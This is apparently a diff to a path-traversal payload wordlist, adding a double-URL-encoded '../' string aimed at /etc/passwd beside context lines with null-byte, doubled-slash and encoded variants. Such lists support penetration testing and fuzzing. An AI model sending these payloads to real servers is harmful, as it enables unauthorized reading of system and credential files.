@@ -36,6 +36,7 @@ ___
 /var/www/images/../../../etc/passwd%00.php
 /var/www/images/..//..//..//..//etc/passwd%00.php
 /var/www/images/....//....//....//....//etc/passwd%00.php
+..%252f..%252f..%252fetc/passwd
 %2Fetc%2Fpasswd
 %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
 %2e%2e%2f%2f%2e%2e%2f%2f%2e%2e%2f%2fetc%2e%2e%2fpasswd
